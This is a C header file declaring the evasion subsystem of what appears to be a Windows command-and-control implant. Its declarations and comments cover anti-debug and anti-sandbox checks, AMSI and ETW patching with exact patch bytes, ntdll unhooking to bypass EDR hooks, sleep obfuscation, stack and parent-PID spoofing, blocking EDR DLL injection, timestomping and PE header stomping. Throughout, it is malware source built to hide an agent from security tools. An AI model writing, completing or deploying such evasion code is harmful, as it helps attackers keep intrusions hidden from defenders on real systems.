/*
 * evasion.h — Evasion subsystem declarations.
 *
 * Organized by timing:
 *   LOAD-TIME:  Anti-debug, anti-sandbox, string encryption (before agent_init)
 *   RUN-TIME:   AMSI patch, ETW patch, ntdll unhook, sleep obfuscation (agent init + loop)
 *   POST-EX:    PPID spoofing, blockdlls (when spawning child processes)
 */
#ifndef EVASION_H
#define EVASION_H

#include <windows.h>

/* ═══════════════════════════════════════════════════════════════════
 *  BUILD-TIME / LOAD-TIME EVASION
 * ═══════════════════════════════════════════════════════════════════ */

/*
 * String encryption — compile-time XOR with single-byte key.
 * The build script (build_agent_c.py) replaces plaintext strings with
 * XOR-encrypted blobs + a decrypt call. At runtime, strings are
 * decrypted on the stack and zeroed after use.
 *
 * Manual usage for inline strings:
 *   char buf[64];
 *   xor_decrypt(buf, encrypted_blob, blob_len, XOR_KEY);
 *   ... use buf ...
 *   SecureZeroMemory(buf, sizeof(buf));
 */
/* XOR_KEY is now defined in config.h as CONFIG_XOR_KEY (randomized per build) */
#ifndef XOR_KEY
#define XOR_KEY CONFIG_XOR_KEY
#endif

void xor_decrypt(char *out, const unsigned char *data, DWORD len, BYTE key);
void xor_decrypt_w(wchar_t *out, const unsigned char *data, DWORD len, BYTE key);

/*
 * Anti-analysis checks — run before agent_init.
 * Returns TRUE if environment is safe to run, FALSE if debugged/sandboxed.
 * Configurable via CONFIG_ANTI_DEBUG and CONFIG_ANTI_SANDBOX in config.h.
 */
BOOL anti_analysis_check(void);

/* Individual checks (called by anti_analysis_check) */
BOOL check_debugger_present(void);          /* IsDebuggerPresent + PEB->BeingDebugged */
BOOL check_remote_debugger(void);           /* NtQueryInformationProcess(DebugPort) */
BOOL check_hardware_breakpoints(void);      /* GetThreadContext DR0-DR3 */
BOOL check_timing(void);                    /* rdtsc delta detection */
BOOL check_sandbox_resources(void);         /* CPU count, RAM, disk, uptime */
BOOL check_sandbox_artifacts(void);         /* Known sandbox process names, files, registry */
BOOL check_vm_hypervisor(void);             /* CPUID hypervisor bit + vendor string */


/* ═══════════════════════════════════════════════════════════════════
 *  RUN-TIME EVASION
 * ═══════════════════════════════════════════════════════════════════ */

/*
 * Patch AMSI — neutralize AmsiScanBuffer in amsi.dll.
 * Called before any Assembly.Load or script execution.
 * Patch: mov eax, 0x80070057; ret (E_INVALIDARG → always "clean")
 */
BOOL evasion_patch_amsi(void);

/*
 * Patch ETW — neutralize EtwEventWrite in ntdll.dll.
 * Prevents CLR runtime events (assembly load, JIT, etc.) from logging.
 * Patch: xor rax,rax; ret (return SUCCESS, do nothing)
 */
BOOL evasion_patch_etw(void);

/*
 * Unhook ntdll.dll — restore .text section from clean disk copy.
 * EDR products hook ntdll functions with JMP trampolines; this
 * overwrites the hooked .text with the original from disk.
 */
BOOL evasion_unhook_ntdll(void);

/*
 * Sleep obfuscation (Ekko-style) — during sleep:
 *   1. Encrypt agent memory with RC4 (SystemFunction032)
 *   2. Set memory to RW (non-executable)
 *   3. Sleep
 *   4. Set memory back to RX
 *   5. Decrypt agent memory
 *
 * Prevents memory scanners from finding agent code during sleep.
 * Falls back to plain Sleep() if obfuscation setup fails.
 */
void evasion_sleep_obfuscated(DWORD milliseconds);

/*
 * Thread stack spoofing — spoof the return address on the call
 * stack of sleeping threads to hide the true caller.
 * Called just before sleep, restored after wake.
 */
BOOL evasion_spoof_stack(void **saved_context);
void evasion_restore_stack(void *saved_context);


/* ═══════════════════════════════════════════════════════════════════
 *  POST-EXPLOITATION EVASION
 * ═══════════════════════════════════════════════════════════════════ */

/*
 * PPID spoofing — create a process with a spoofed parent PID.
 * Uses PROC_THREAD_ATTRIBUTE_PARENT_PROCESS in CreateProcessW.
 * The child process appears to be spawned by the specified parent.
 */
BOOL evasion_create_process_ppid_spoof(
    const wchar_t *command_line,
    DWORD parent_pid,
    BOOL block_dlls,              /* Also apply blockdlls? */
    PROCESS_INFORMATION *pi_out
);

/*
 * Block non-Microsoft DLLs — create a process with
 * PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON.
 * Prevents EDR DLLs from being injected into the child process.
 */
BOOL evasion_create_process_blockdlls(
    const wchar_t *command_line,
    PROCESS_INFORMATION *pi_out
);

/*
 * Timestomp — copy timestamps from a donor file to the target file.
 * Default donor: C:\Windows\System32\kernel32.dll
 */
BOOL evasion_timestomp(const wchar_t *target_path, const wchar_t *donor_path);


/* ═══════════════════════════════════════════════════════════════════
 *  STATIC SIGNATURE EVASION
 * ═══════════════════════════════════════════════════════════════════ */

/*
 * PE header stomping — zero DOS/NT/section headers in memory.
 * Call AFTER all init code that reads PE headers is done.
 * Prevents pe-sieve/moneta from identifying the agent as a PE.
 */
BOOL evasion_stomp_pe_headers(void);

/*
 * Dynamic API resolution — resolve functions via PEB walk + DJB2 hash.
 * Avoids plaintext function names in binary and IAT monitoring.
 * Use api_resolve() / RESOLVE_API() macros from api_resolve.h.
 */


/* ═══════════════════════════════════════════════════════════════════
 *  INIT — master evasion setup (called from agent_init)
 * ═══════════════════════════════════════════════════════════════════ */

/*
 * Run all configured evasion patches based on config.h flags.
 * Order: anti-analysis → unhook ntdll → ETW → AMSI → syscalls → stack spoof → PE stomp
 * Returns FALSE if anti-analysis check fails (agent should exit).
 */
BOOL evasion_init(void);

#endif /* EVASION_H */
